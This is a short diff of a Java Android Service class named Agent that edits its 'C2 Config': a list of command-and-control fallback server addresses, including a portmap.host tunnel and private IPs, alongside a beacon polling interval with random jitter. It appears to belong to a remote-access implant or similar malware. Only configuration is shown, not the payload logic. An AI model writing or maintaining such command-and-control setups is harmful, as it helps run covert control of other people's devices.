@@ -22,9 +22,9 @@ public class Agent extends Service {
 
     // ── C2 Config ──────────────────────────────────────────────
     private static final String[] C2_FALLBACKS = {
-        "http://geeksshport4-59956.portmap.host:59956",
         "http://100.68.158.25:8080",
-        "http://10.169.55.196:8080",
+        "http://geeksshport4-59956.portmap.host:59956",
+        "http://192.168.0.107:8080",
     };
     private static final long POLL_MS = 60000;
     private static final long JITTER_MS = 15000; // ±15s random jitter
